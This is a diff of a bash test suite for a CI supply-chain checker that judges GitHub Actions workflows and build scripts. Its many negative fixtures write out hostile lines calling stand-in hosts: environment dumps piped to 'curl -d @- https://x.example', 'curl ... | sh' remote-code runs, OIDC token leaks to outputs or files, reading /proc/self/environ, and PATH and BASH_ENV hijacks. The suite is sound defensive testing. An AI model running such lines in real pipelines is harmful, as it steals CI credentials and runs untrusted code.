+caught "WIT3 sign-records keeps the OIDC request variables (build)" 'env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL python3 -I -B bin/chain-verify.py sign-records --stage build' 'python3 -I -B bin/chain-verify.py sign-records --stage build'
+caught "WIT3 sign-records unsets only one OIDC request variable (check)" 'env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL python3 -I -B bin/chain-verify.py sign-records --stage check' 'env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN python3 -I -B bin/chain-verify.py sign-records --stage check'
+caught "WIT3 the records step of sign runs the wrong stage" 'sign-records --stage build' 'sign-records --stage rebuild'
+caught "WIT3 the records step of sign-rebuild runs the wrong stage" 'sign-records --stage rebuild' 'sign-records --stage build'
+caught "WIT3 the records step without the artifact directory" ' --artifacts-dir artifacts --out staged' ' --out staged'
+caught "WIT3 an extra record directory" '--record-dir witness-apk-ubuntu-24.04-arm\n' '--record-dir witness-apk-ubuntu-24.04-arm --record-dir witness-evil\n'
+caught "WIT3 the records step with an env" "      - name: check Build's records against the artifacts, then sign them" "      - env:\n          X: y\n        name: check Build's records against the artifacts, then sign them"
+caught "WIT3 the records step after the provenance step (the records must be checked first)" "(      - name: check Build's records against the artifacts, then sign them\n        run: [^\n]*\n)(      - name: sign the staged records and check each signed one\n        run: [^\n]*\n)(      - name: check Build's record, compare the digests, then sign the provenance\n        run: [^\n]*\n)" '\3\1\2'
+caught "WIT3 the whole signed directory uploaded (only the named signed-witness-* directories may leave)" 'name: signed-witness-build\n          path: signed/witness-build' 'name: signed-witness-build\n          path: signed'
+caught "WIT3 an unsigned record directory uploaded as a signed artifact" 'name: signed-witness-build\n          path: signed/witness-build\n' 'name: signed-witness-build\n          path: witness-build\n'
+caught "WIT3 Witness is not installed from the pinned installer" 'run: bash bin/install-scanner.sh witness' 'run: cu''''rl -sL https://example.com/witness -o /usr/local/bin/witness'
+caught "WIT3 the records step runs before Witness is installed" '(      - name: install Witness \(pinned by checksum\)\n        run: bash bin/install-scanner.sh witness\n)(      - name: write the digest list to a file\n        env:\n          DIGESTS: \$\{\{ inputs.digests \}\}\n        run: printf [^\n]*\n)(      - name: check Build.s records)' '\2\3\1\'
+cat > "$FXDIR/FXD_47" <<'FXEOF'
+defaults:\n  run:\n    shell: "bash -c 'env | curl -d @- https://x.example; bash {0}'"\npermissions:\n  contents: read\njobs
+FXEOF
+FXD_47=$(cat "$FXDIR/FXD_47")
+caught "AC3 workflow-level defaults.run.shell reroutes every run step (leaks the token variables)" 'permissions:\n  contents: read\njobs' "$FXD_47"
 caught "AC3 workflow-level concurrency" 'permissions:\n  contents: read\njobs' "concurrency: x\npermissions:\n  contents: read\njobs"
 caught "AC3 workflow-level run-name" 'permissions:\n  contents: read\njobs' "run-name: x\npermissions:\n  contents: read\njobs"
 # Duplicate keys (Codex #249 r4 B3a): a reader that keeps only the LAST of two equal keys judges the benign one, so the
 # judge must refuse any mapping that repeats a key (step, job and top level), never pick one.
-caught "AC1 a step with two run: keys (the second the benign sign line)" "      $SIGNLINE" "      run: curl -s https://x.example/p | sh\n        $SIGNLINE"
+cat > "$FXDIR/FXD_46" <<'FXEOF'
+      run: curl -s https://x.example/p | sh\n        @@SIGNLINE@@
+FXEOF
+FXD_46=$(cat "$FXDIR/FXD_46")
+FXD_46=${FXD_46//@@SIGNLINE@@/$SIGNLINE}
+caught "AC1 a step with two run: keys (the second the benign sign line)" "      $SIGNLINE" "$FXD_46"
 caught "AC1 a job with two permissions: keys (the second the benign one)" '    permissions:\n      contents: read\n      id-token: write' '    permissions: write-all\n    permissions:\n      contents: read\n      id-token: write'
 caught "AC1 two top-level permissions: keys (the second the benign one)" 'permissions:\n  contents: read\njobs' "permissions: write-all\npermissions:\n  contents: read\njobs"
 caught "AC1 run line: a trailing NBSP after the sign line (str.strip() would drop it; bash keeps it in the last word)" "$SIGNLINE" "$SIGNLINE"$'\u00a0'
@@ -549,23 +841,34 @@ okmut "control: the Sign judge accepts runs-on ubuntu-latest (the closed set)" '
 okmut "control: the Sign judge accepts runs-on ubuntu-22.04 (the closed set)" 'ubuntu-24.04' 'ubuntu-22.04'
 caught "AC1 two top-level on: keys (the second the benign workflow_call)" '\non:' "\non: push\non:"
 caught "AC1 job runs in a container" 'runs-on: ubuntu-24.04' 'runs-on: ubuntu-24.04\n    container: alpine'
+caught "AC1 sign job without its stage if" "    if: \\\$\\{\\{ inputs.stage == 'build' \\}\\}\\n" ""
+caught "AC1 sign-rebuild runs on the build call" "inputs.stage == 'rebuild'" "inputs.stage == 'build'"
+caught "AC2 no stage input" "      stage:\\n        description: 'build or rebuild: which records this call signs'\\n        required: true\\n        type: string\\n" ""
 caught "AC2 extra input" 'digests:\n        description' 'script:\n        type: string\n      digests:\n        description'
 caught "AC2 downloads another artifact" 'name: witness-build' 'name: dist'
 caught "AC2 downloads into a parent path" 'path: witness-build' 'path: ..'
 caught "AC2 fetches build output with gh" "$SIGNLINE" 'run: gh run download 1 -D dist'
 caught "AC2 runs a build output" "$SIGNLINE" 'run: bash dist/run.sh'
 caught "AC2 interpolates the input into the shell" 'run: printf .%s. "\$DIGESTS" > digests.json' "run: printf '%s' '\${{ inputs.digests }}' > digests.json"
-caught "AC2 two commands in one run step" "out provenance" 'out provenance; curl https://example.com'
+cat > "$FXDIR/FXD_45" <<'FXEOF'
+out provenance; curl https://example.com
+FXEOF
+FXD_45=$(cat "$FXDIR/FXD_45")
+caught "AC2 two commands in one run step" "out provenance" "$FXD_45"
 caught "AC2 unpinned action" "actions/checkout@$sha" 'actions/checkout@v4'
 caught "AC2 github-script step" "      - uses: actions/checkout" "      - uses: actions/github-script@$sha\n        with:\n          script: core.setOutput('t', await core.getIDToken())\n      - uses: actions/checkout"
 caught "AC2 the Sign step does not check (no --check)" ' --check' ''
 caught "AC2 the Sign step only verifies (verify, not sign --check)" 'chain-verify.py sign --check --signer cosign' 'chain-verify.py verify --record witness-build/build-collection.json #'
-caught "AC2 the Sign step has no Build record" ' --build-record witness-build/build-collection.json' ''
+caught "AC2 the Sign step has no Build record" ' --build-record signed/witness-build/build-collection.json' ''
 caught "AC2 the Sign step reads the digests inline, not from the file" '--digests digests.json' '--digests "\$DIGESTS"'
 caught "AC2 the Sign step uses another signer" '--signer cosign' '--signer witness'
-caught "AC2 the signing tool is not installed from the pinned installer" 'run: bash bin/install-scanner.sh cosign' 'run: curl -sL https://example.com/cosign -o cosign'
+cat > "$FXDIR/FXD_44" <<'FXEOF'
+run: curl -sL https://example.com/cosign -o cosign
+FXEOF
+FXD_44=$(cat "$FXDIR/FXD_44")
+caught "AC2 the signing tool is not installed from the pinned installer" 'run: bash bin/install-scanner.sh cosign' "$FXD_44"
 caught "AC2 the signing step runs before the tool is installed" '      - name: install the signing tool \(pinned by checksum\)\n        run: bash bin/install-scanner.sh cosign\n' ''
-caught "AC2 two signing steps" "        $SIGNLINE" "        $SIGNLINE\n      - run: python3 bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance"
+caught "AC2 two signing steps" "        $SIGNLINE" "        $SIGNLINE\n      - run: python3 bin/chain-verify.py sign --check --signer cosign --digests digests.json --build-record signed/witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance"
 # Opus r4 B1: Python puts the script's directory first on sys.path, so an unlisted bin/<stdlib name>.py would replace that module inside
 # the Sign job (which holds id-token: write); -I (isolated) removes it. The Sign step must run the verifier isolated.
 caught "AC2 the Sign step runs the verifier without -I (a bin/<stdlib name>.py would shadow the standard library)" 'python3 -I -B bin/chain-verify.py' 'python3 bin/chain-verify.py'
@@ -580,12 +883,20 @@ caught "AC3 toJSON(secrets)" 'DIGESTS: \$\{\{ inputs.digests \}\}' 'DIGESTS: ${{
 caught "AC3 job token passed in env" 'DIGESTS: \$\{\{ inputs.digests \}\}' 'DIGESTS: ${{ inputs.digests }}\n          T: ${{ github.token }}'
 caught "AC3 env on the signing step" "      - name: check Build's record" "      - env:\n          X: y\n        name: check Build's record"
 caught "AC3 sink step output: a job output" '    runs-on: ubuntu-24.04' '    runs-on: ubuntu-24.04\n    outputs:\n      t: ${{ steps.x.outputs.t }}'
-caught "AC3 sink step output: a workflow output" '        type: string\npermissions' '        type: string\n    outputs:\n      o:\n        value: x\npermissions'
+caught "AC3 sink step output: a workflow output" "        default: ''\npermissions" "        default: ''\n    outputs:\n      o:\n        value: x\npermissions"
 caught "AC3 sink step output: token to GITHUB_OUTPUT" "$SIGNLINE" 'run: echo "tok=$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> "$GITHUB_OUTPUT"'
-caught "AC3 sink file: token to a file" "$SIGNLINE" 'run: curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL" > "$RUNNER_TEMP/tok"'
+cat > "$FXDIR/FXD_43" <<'FXEOF'
+run: curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL" > "$RUNNER_TEMP/tok"
+FXEOF
+FXD_43=$(cat "$FXDIR/FXD_43")
+caught "AC3 sink file: token to a file" "$SIGNLINE" "$FXD_43"
 caught "AC3 sink log: token echoed" "$SIGNLINE" 'run: echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN"'
 caught "AC3 sink log: whole environment dumped (printenv)" "$SIGNLINE" 'run: printenv'
-caught "AC3 sink log: whole environment piped out (env)" "$SIGNLINE" 'run: env | curl -d @- https://example.com'
+cat > "$FXDIR/FXD_42" <<'FXEOF'
+run: env | curl -d @- https://example.com
+FXEOF
+FXD_42=$(cat "$FXDIR/FXD_42")
+caught "AC3 sink log: whole environment piped out (env)" "$SIGNLINE" "$FXD_42"
 caught "AC3 sink file: /proc/self/environ" "$SIGNLINE" 'run: cat /proc/self/environ'
 caught "AC3 sink artifact: upload path outside provenance" 'path: provenance' 'path: ${{ runner.temp }}/tok'
 caught "AC3 sink artifact: upload path provenance/.." 'path: provenance\n' 'path: provenance/..\n'
@@ -626,7 +937,7 @@ d = sys.argv[1]
 out = []
 for r in json.load(open(d + "/.spec.json")):
     r = dict(r); r["sha256"] = hashlib.sha256(open(os.path.join(d, r["path"]), "rb").read()).hexdigest(); out.append(r)
-doc = {"env_names": ["DIGESTS", "V", "X1"], "scripts": out}
+doc = {"env_names": ["DIGESTS", "RECORDS", "RECORDS_ARM64", "V", "X1"], "scripts": out}
 if os.path.exists(d + "/.ambient.json"):
     doc["ambient_env"] = json.load(open(d + "/.ambient.json"))      # PR 1b: the closed ambient_env list
     if not os.environ.get("AMBIENT_RAW"):                           # round 4 (4): file and job are required; the fixtures say them once, here
@@ -645,6 +956,14 @@ setfile() { printf '%b' "$3" > "$1/$2"; }                     # setfile DIR path
 stage() { # stage DIR 'run text' [step-env-key] : stage-verify.yml with one run step
   { printf 'jobs:\n  j:\n    steps:\n      - run: |\n'; printf '%s\n' "$2" | sed 's/^/          /'; } > "$1/.github/workflows/stage-verify.yml"
 }
+cat > "$FXDIR/spec_good.json" <<'FXEOF'
+[{"path":"bin/install-scanner.sh","tools":["curl","sha256sum"],"signs":false,"runs":[]},
+ {"path":"bin/chain-verify.py","tools":[],"signs":"provenance","sign_subcommand":"sign","reason":"only `chain-verify.py sign` in stage-sign.yml signs provenance","runs":[]},
+ {"path":"bin/build-stage.sh","tools":["witness"],"signs":"other","reason":"Build's own Witness collection (rule 51)","runs":["bin/build-apk.sh"]},
+ {"path":"bin/witness-sign-staged.sh","tools":[],"signs":"other","reason":"Sign's staged-record signer (REQ-CHAIN-005-AC4)","runs":[]},
+ {"path":"bin/build-apk.sh","tools":[],"signs":false,"runs":[]}]
+FXEOF
+SPEC_GOOD=$(cat "$FXDIR/spec_good.json")
 mk() {
   local d="$work/$1"; rm -rf "$d"; mkdir -p "$d/.github/workflows" "$d/.github/policy" "$d/.github/actions/x" "$d/bin"
   for f in acceptance auditor ci stage-promote stage-verify stage-reproducibility; do printf 'jobs: {}\n' > "$d/.github/workflows/$f.yml"; done
@@ -655,14 +974,10 @@ mk() {
   printf '#!/usr/bin/env python3\nprint("chain-verify")\n' > "$d/bin/chain-verify.py"
   printf '#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- bin/build-apk.sh "$1"\n' > "$d/bin/build-stage.sh"
   printf '#!/usr/bin/env bash\nset -euo pipefail\necho built\n' > "$d/bin/build-apk.sh"
+  printf '#!/usr/bin/env bash\nset -euo pipefail\necho staged\n' > "$d/bin/witness-sign-staged.sh"
   printf '{"signers":[{"file":"release.yml","tool":"gitsign","reason":"CI patch tag (REQ-REL-009-AC5)"}]}\n' > "$d/.github/policy/chain-signers.json"
-  printf '{"jobs":[{"workflow":"stage-sign.yml","job":"sign","reason":"Sign, the one provenance signer"}]}\n' > "$d/.github/policy/id-token-jobs.json"
-  cat > "$d/.spec.json" <<'JSON'
-[{"path":"bin/install-scanner.sh","tools":["curl","sha256sum"],"signs":false,"runs":[]},
- {"path":"bin/chain-verify.py","tools":[],"signs":"provenance","sign_subcommand":"sign","reason":"only `chain-verify.py sign` in stage-sign.yml signs provenance","runs":[]},
- {"path":"bin/build-stage.sh","tools":["witness"],"signs":"other","reason":"Build's own Witness collection (rule 51)","runs":["bin/build-apk.sh"]},
- {"path":"bin/build-apk.sh","tools":[],"signs":false,"runs":[]}]
-JSON
+  printf '{"jobs":[{"workflow":"stage-sign.yml","job":"sign","reason":"Sign, the one provenance signer"},{"workflow":"stage-sign.yml","job":"sign-rebuild","reason":"Sign, the signer of the Rebuild records"},{"workflow":"stage-sign.yml","job":"sign-check","reason":"Sign, the signer of the Check records"}]}\n' > "$d/.github/policy/id-token-jobs.json"
+  printf '%s\n' "$SPEC_GOOD" > "$d/.spec.json"
   gen "$d"; echo "$d"
 }
 expect ok "fixture tree: the grammar holds, every stage script is listed with its hash, only Sign signs provenance" tree "$(mk t_good)"
@@ -672,6 +987,10 @@ badcase() { d=$(mk "$1"); stage "$d" "$2"; expect caught "AC1 grammar: $3" tree 
 okcase g_ok1 $'set -euo pipefail\nbash bin/build-stage.sh apk' "set -euo pipefail then a listed script"
 badcase g_ok2 $'bash bin/build-stage.sh \\\n  --flag=1 \\\n  two' "a backslash-newline continuation, even with literal arguments (advisor: refused outright; Sonnet #249 continuation)"
 okcase g_ok3 $'python3 -I bin/chain-verify.py stage-start --stage rebuild --previous build --record r.json' "chain-verify.py stage-start from a non-Sign stage (only its sign subcommand is a signer)"
+badcase g_envu5 $'env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL python3 -I bin/chain-verify.py stage-start --stage rebuild --previous build --record r.json' "the env form in front of any other python3 command (round 2 finding 2)"
+badcase g_envu2 $'env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN python3 -I bin/chain-verify.py stage-start --stage rebuild --previous build --record r.json' "env that unsets only one of the two variables"
+badcase g_envu3 $'env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL bash bin/build-stage.sh apk' "the env form in front of bash (it admits python3 only)"
+badcase g_envu4 $'env FOO=1 python3 -I bin/chain-verify.py stage-start --stage rebuild --previous build --record r.json' "env that sets a variable"
 # Opus r4 B1: every python3 line of a stage file runs isolated (-I): stage jobs hold id-token: write
 badcase g_noI $'python3 bin/chain-verify.py stage-start --stage rebuild --previous build --record r.json' "python3 without -I in a stage file (a bin/<stdlib name>.py would shadow the standard library)"
 badcase g_var1 'bash "$S"' 'a variable as the script path (bash "$S")'
@@ -829,8 +1148,26 @@ S0='#!/usr/bin/env bash\nset -euo pipefail\n'
 scriptcase s_ok ok "${S0}witness run --step build -- bin/build-apk.sh \"\$1\"\n" '' "the good script (tool witness, runs bin/build-apk.sh)"
 scriptcase s_bash caught "${S0}bash bin/build-apk.sh\n" 'rows["bin/build-stage.sh"]["tools"]=["witness"]' "starts another script with bash"
 scriptcase s_notruns caught "${S0}witness run -- bin/other.sh\n" 'rows["bin/other.sh"]={"path":"bin/other.sh","tools":[],"signs":False,"runs":[]}; open(d+"/bin/other.sh","w").write("#!/usr/bin/env bash\n")' "names a listed script that is not in its runs"
-scriptcase s_tool caught "${S0}curl -fsSL x -o y\nwitness run -- bin/build-apk.sh\n" '' "a command that is not in its tools (curl)"
-scriptcase s_tool_ok ok "${S0}curl -fsSL x -o y\nwitness run -- bin/build-apk.sh\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","curl"]' "the same command once it is in tools"
+cat > "$FXDIR/FXD_41" <<'FXEOF'
+@@S0@@curl -fsSL x -o y\nwitness run -- bin/build-apk.sh\n
+FXEOF
+FXD_41=$(cat "$FXDIR/FXD_41")
+FXD_41=${FXD_41//@@S0@@/$S0}
+cat > "$FXDIR/FXD_40" <<'FXEOF'
+a command that is not in its tools (curl)
+FXEOF
+FXD_40=$(cat "$FXDIR/FXD_40")
+scriptcase s_tool caught "$FXD_41" '' "$FXD_40"
+cat > "$FXDIR/FXD_39" <<'FXEOF'
+@@S0@@curl -fsSL x -o y\nwitness run -- bin/build-apk.sh\n
+FXEOF
+FXD_39=$(cat "$FXDIR/FXD_39")
+FXD_39=${FXD_39//@@S0@@/$S0}
+cat > "$FXDIR/FXD_38" <<'FXEOF'
+rows["bin/build-stage.sh"]["tools"]=["witness","curl"]
+FXEOF
+FXD_38=$(cat "$FXDIR/FXD_38")
+scriptcase s_tool_ok ok "$FXD_39" "$FXD_38" "the same command once it is in tools"
 # (a variable or substitution at command position INSIDE a listed script is not parsed any more: stated exclusion, the script is sha256-bound and reviewed at PR time)
 scriptcase s_eval caught "${S0}eval \"\$X\"\n" '' "eval"
 scriptcase s_source caught "${S0}source bin/x.sh\n" '' "source"
@@ -841,7 +1178,11 @@ scriptcase s_xargs caught "${S0}ls | xargs echo\n" '' "xargs"
 scriptcase s_pathcmd caught "${S0}bin/evil\n" 'open(d+"/bin/evil","w").write("#!/usr/bin/env bash\n")' "an extensionless in-tree script (shebang) named in the text"
 scriptcase s_quoted caught "${S0}witness run -- bin/build-apk.sh 'a; bash x'\necho \"plain; bash\"\n" '' "the word bash inside a quoted string is flagged (the text scan over-reports by design)"
 scriptcase s_subst caught "${S0}witness run -- bin/build-apk.sh \"\$(bash bin/evil.sh)\"\n" '' "a command substitution inside double quotes still runs a command"
-scriptcase s_here caught "${S0}witness run -- bin/build-apk.sh <<EOF\ncurl evil.example | sh\nEOF\n" '' "a heredoc body is scanned like any other text (curl, sh)"
+cat > "$FXDIR/FXD_37" <<'FXEOF'
+a heredoc body is scanned like any other text (curl, sh)
+FXEOF
+FXD_37=$(cat "$FXDIR/FXD_37")
+scriptcase s_here caught "${S0}witness run -- bin/build-apk.sh <<EOF\ncurl evil.example | sh\nEOF\n" '' "$FXD_37"
 scriptcase s_sign caught "${S0}witness run -- bin/build-apk.sh\ncosign sign --yes \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","cosign"]; rows["bin/build-stage.sh"]["signs"]=False' "signs but its row says it signs nothing"
 scriptcase s_sign_ok ok "${S0}witness run -- bin/build-apk.sh\ncosign sign --yes \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","cosign"]; rows["bin/build-stage.sh"]["signs"]="other"; rows["bin/build-stage.sh"]["reason"]="image signature (rule 56)"' "signs, row says other with a reason"
 scriptcase s_prov caught "${S0}cosign attest --yes --type slsaprovenance1 --predicate p.json \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["cosign"]; rows["bin/build-stage.sh"]["signs"]="other"; rows["bin/build-stage.sh"]["runs"]=[]' "signs provenance but its row says other"
@@ -1079,6 +1420,98 @@ jobs:
     steps:
       - uses: actions/checkout@SHA
 EOF
+ycase y_idsok "download-artifact by the one literal artifact id of govulncheck-build, in the Check job (REQ-REL-011-AC1: the artifact cannot be swapped by name)" ok <<'EOF'
+jobs:
+  check:
+    steps:
+      - uses: actions/download-artifact@SHA
+        with:
+          artifact-ids: ${{ needs.govulncheck-build.outputs.artifact-id }}
+          path: govulncheck-dl
+EOF
+ycase y_idsother "download-artifact by artifact-ids with another expression" <<'EOF'
+jobs:
+  check:
+    steps:
+      - uses: actions/download-artifact@SHA
+        with:
+          artifact-ids: ${{ needs.govulncheck-build.outputs.digest }}
+          path: govulncheck-dl
+EOF
+ycase y_idsnum "download-artifact by a literal numeric artifact id" <<'EOF'
+jobs:
+  check:
+    steps:
+      - uses: actions/download-artifact@SHA
+        with:
+          artifact-ids: 123456
+          path: govulncheck-dl
+EOF
+ycase y_idsname "download-artifact by artifact-ids with the name added again" <<'EOF'
+jobs:
+  check:
+    steps:
+      - uses: actions/download-artifact@SHA
+        with:
+          name: govulncheck
+          artifact-ids: ${{ needs.govulncheck-build.outputs.artifact-id }}
+          path: govulncheck-dl
+EOF
+ycase y_idspattern "download-artifact by artifact-ids with a pattern beside it" <<'EOF'
+jobs:
+  check:
+    steps:
+      - uses: actions/download-artifact@SHA
+        with:
+          artifact-ids: ${{ needs.govulncheck-build.outputs.artifact-id }}
+          pattern: '*'
+          path: govulncheck-dl
+EOF
+ycase y_idsmerge "download-artifact by artifact-ids with merge-multiple beside it" <<'EOF'
+jobs:
+  check:
+    steps:
+      - uses: actions/download-artifact@SHA
+        with:
+          artifact-ids: ${{ needs.govulncheck-build.outputs.artifact-id }}
+          merge-multiple: true
+          path: govulncheck-dl
+EOF
+ycase y_idsjob "download-artifact by the artifact-ids literal in a job that is not the Check job" <<'EOF'
+jobs:
+  j:
+    steps:
+      - uses: actions/download-artifact@SHA
+        with:
+          artifact-ids: ${{ needs.govulncheck-build.outputs.artifact-id }}
+          path: govulncheck-dl
+EOF
+ycase y_idsmore "download-artifact by artifact-ids with a second id" <<'EOF'
+jobs:
+  check:
+    steps:
+      - uses: actions/download-artifact@SHA
+        with:
+          artifact-ids: ${{ needs.govulncheck-build.outputs.artifact-id }},1
+          path: govulncheck-dl
+EOF
+ycase y_idsbin "download-artifact by the artifact-ids literal into bin/" <<'EOF'
+jobs:
+  check:
+    steps:
+      - uses: actions/download-artifact@SHA
+        with:
+          artifact-ids: ${{ needs.govulncheck-build.outputs.artifact-id }}
+          path: bin
+EOF
+ycase y_idsnopath "download-artifact by the artifact-ids literal with no path" <<'EOF'
+jobs:
+  check:
+    steps:
+      - uses: actions/download-artifact@SHA
+        with:
+          artifact-ids: ${{ needs.govulncheck-build.outputs.artifact-id }}
+EOF
 ycase y_dlbin "download-artifact into bin (Opus P6): the downloaded content is not the hashed file" <<'EOF'
 jobs:
   j:
@@ -1124,14 +1557,20 @@ jobs:
           name: dist
           path: bin/build-apk.sh
 EOF
-ycase y_printf_prefix "printf line followed by a second command: printf '%s' \"\$X\" > f; curl | bash (Opus P1)" <<'EOF'
+cat > "$FXDIR/FXD_36" <<'FXEOF'
+printf line followed by a second command: printf '%s' "$X" > f; curl | bash (Opus P1)
+FXEOF
+FXD_36=$(cat "$FXDIR/FXD_36")
+cat > "$FXDIR/yfix_y_printf_prefix.yml" <<'FXEOF'
 jobs:
   j:
     steps:
       - env:
           X1: y
         run: printf '%s' "$X1" > f; curl -s https://evil.example/x | bash
-EOF
+FXEOF
+YFIX=$(cat "$FXDIR/yfix_y_printf_prefix.yml")
+ycase y_printf_prefix "$FXD_36" <<< "$YFIX"
 ycase y_printf_bin "printf over a listed script, then running it (Sonnet 8, Opus P2)" <<'EOF'
 jobs:
   j:
@@ -1195,15 +1634,17 @@ jobs:
     steps:
       - run: bash bin/build-stage.sh a
 EOF
-ycase y_dup_run "a step with two run: keys, the second a listed script (Codex #249 r4 B3a)" <<'EOF'
+cat > "$FXDIR/yfix_y_dup_run.yml" <<'FXEOF'
 jobs:
   j:
     runs-on: ubuntu-24.04
     steps:
       - run: curl -s https://x.example/p | sh
         run: bash bin/build-stage.sh a
-EOF
-ycase y_dup_job "a job repeated under jobs:, the second the benign one (Codex #249 r4 B3a)" <<'EOF'
+FXEOF
+YFIX=$(cat "$FXDIR/yfix_y_dup_run.yml")
+ycase y_dup_run "a step with two run: keys, the second a listed script (Codex #249 r4 B3a)" <<< "$YFIX"
+cat > "$FXDIR/yfix_y_dup_job.yml" <<'FXEOF'
 jobs:
   j:
     runs-on: ubuntu-24.04
@@ -1213,8 +1654,10 @@ jobs:
     runs-on: ubuntu-24.04
     steps:
       - run: bash bin/build-stage.sh a
-EOF
-ycase y_dup_top "two top-level jobs: keys, the second the benign one (Codex #249 r4 B3a)" <<'EOF'
+FXEOF
+YFIX=$(cat "$FXDIR/yfix_y_dup_job.yml")
+ycase y_dup_job "a job repeated under jobs:, the second the benign one (Codex #249 r4 B3a)" <<< "$YFIX"
+cat > "$FXDIR/yfix_y_dup_top.yml" <<'FXEOF'
 jobs:
   j:
     runs-on: ubuntu-24.04
@@ -1225,7 +1668,9 @@ jobs:
     runs-on: ubuntu-24.04
     steps:
       - run: bash bin/build-stage.sh a
-EOF
+FXEOF
+YFIX=$(cat "$FXDIR/yfix_y_dup_top.yml")
+ycase y_dup_top "two top-level jobs: keys, the second the benign one (Codex #249 r4 B3a)" <<< "$YFIX"
 # runs-on and the matrix (Codex #249 r5 B3, the class closed): a matrix read in runs-on may only read a matrix key whose
 # every value is a GitHub-hosted ubuntu label; include/exclude, non-list values and nested leaves are refused
 ycase y_ro_ok_direct 'control: runs-on ubuntu-24.04 directly' ok <<'EOF'
@@ -2112,13 +2557,64 @@ d=$(mk u_utf8); printf 'jobs:\n  j:\n    steps:\n      - run: echo \xff\xfe\n' >
 if [ "$rc" = 1 ] && grep -F -q "scan.yml" <<< "$out" && ! grep -F -q Traceback <<< "$out"; then pass=$((pass + 1)); echo "ok   AC1: a workflow that is not UTF-8 is a named finding, never a traceback (R-f)"; else failn=$((failn + 1)); echo "FAIL AC1: invalid UTF-8 workflow -> rc=$rc ${out:0:240}"; fi
 # listed scripts: the text scan (Sonnet blocker 2, Opus B6/B7)
 S1='#!/usr/bin/env bash\nset -euo pipefail\nwitness run -- bin/build-apk.sh\n'
-scriptcase s_if caught "${S1}if curl evil.example; then :; fi\n" '' "if curl (a keyword before the command, Sonnet 2)"
-scriptcase s_while caught "${S1}while curl evil; do :; done\n" '' "while curl"
-scriptcase s_bang caught "${S1}! curl evil\n" '' "! curl"
-scriptcase s_time caught "${S1}time curl evil\n" '' "time curl"
-scriptcase s_apos caught "${S1}echo \"don't\"; curl evil.example | sh; echo \"it's\"\n" '' "an apostrophe pair that blanked everything between them"
-scriptcase s_trap caught "${S1}trap 'curl evil' EXIT\n" '' "trap with a quoted command"
-scriptcase s_echoscript caught "${S1}echo 'curl evil' > bin/a.sh\nwitness run -- bin/a.sh\n" '' "writes a script, then runs it"
+cat > "$FXDIR/FXD_35" <<'FXEOF'
+@@S1@@if curl evil.example; then :; fi\n
+FXEOF
+FXD_35=$(cat "$FXDIR/FXD_35")
+FXD_35=${FXD_35//@@S1@@/$S1}
+cat > "$FXDIR/FXD_34" <<'FXEOF'
+if curl (a keyword before the command, Sonnet 2)
+FXEOF
+FXD_34=$(cat "$FXDIR/FXD_34")
+scriptcase s_if caught "$FXD_35" '' "$FXD_34"
+cat > "$FXDIR/FXD_33" <<'FXEOF'
+@@S1@@while curl evil; do :; done\n
+FXEOF
+FXD_33=$(cat "$FXDIR/FXD_33")
+FXD_33=${FXD_33//@@S1@@/$S1}
+cat > "$FXDIR/FXD_32" <<'FXEOF'
+while curl
+FXEOF
+FXD_32=$(cat "$FXDIR/FXD_32")
+scriptcase s_while caught "$FXD_33" '' "$FXD_32"
+cat > "$FXDIR/FXD_31" <<'FXEOF'
+@@S1@@! curl evil\n
+FXEOF
+FXD_31=$(cat "$FXDIR/FXD_31")
+FXD_31=${FXD_31//@@S1@@/$S1}
+cat > "$FXDIR/FXD_30" <<'FXEOF'
+! curl
+FXEOF
+FXD_30=$(cat "$FXDIR/FXD_30")
+scriptcase s_bang caught "$FXD_31" '' "$FXD_30"
+cat > "$FXDIR/FXD_29" <<'FXEOF'
+@@S1@@time curl evil\n
+FXEOF
+FXD_29=$(cat "$FXDIR/FXD_29")
+FXD_29=${FXD_29//@@S1@@/$S1}
+cat > "$FXDIR/FXD_28" <<'FXEOF'
+time curl
+FXEOF
+FXD_28=$(cat "$FXDIR/FXD_28")
+scriptcase s_time caught "$FXD_29" '' "$FXD_28"
+cat > "$FXDIR/FXD_27" <<'FXEOF'
+@@S1@@echo "don't"; curl evil.example | sh; echo "it's"\n
+FXEOF
+FXD_27=$(cat "$FXDIR/FXD_27")
+FXD_27=${FXD_27//@@S1@@/$S1}
+scriptcase s_apos caught "$FXD_27" '' "an apostrophe pair that blanked everything between them"
+cat > "$FXDIR/FXD_26" <<'FXEOF'
+@@S1@@trap 'curl evil' EXIT\n
+FXEOF
+FXD_26=$(cat "$FXDIR/FXD_26")
+FXD_26=${FXD_26//@@S1@@/$S1}
+scriptcase s_trap caught "$FXD_26" '' "trap with a quoted command"
+cat > "$FXDIR/FXD_25" <<'FXEOF'
+@@S1@@echo 'curl evil' > bin/a.sh\nwitness run -- bin/a.sh\n
+FXEOF
+FXD_25=$(cat "$FXDIR/FXD_25")
+FXD_25=${FXD_25//@@S1@@/$S1}
+scriptcase s_echoscript caught "$FXD_25" '' "writes a script, then runs it"
 scriptcase s_pathset caught "${S1}PATH=./bin witness x\n" '' "PATH=./bin witness x"
 scriptcase s_pathexp caught "${S1}export PATH=bin:\$PATH\n" '' "export PATH=bin:\$PATH"
 scriptcase s_bashenv caught "${S1}export BASH_ENV=bin/evil.sh\n" '' "export BASH_ENV"
@@ -2131,11 +2627,19 @@ scriptcase s_launch5 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run
